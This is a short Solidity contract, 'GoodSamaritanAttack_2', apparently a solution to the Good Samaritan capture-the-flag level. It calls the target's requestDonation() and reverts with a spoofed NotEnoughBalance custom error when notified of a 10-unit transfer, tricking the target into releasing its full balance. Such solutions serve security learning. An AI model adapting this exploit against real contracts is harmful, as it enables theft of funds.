// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract GoodSamaritanAttack_2 {
    error NotEnoughBalance();

    function attack(address target) external {
        IGoodSamaritan(target).requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
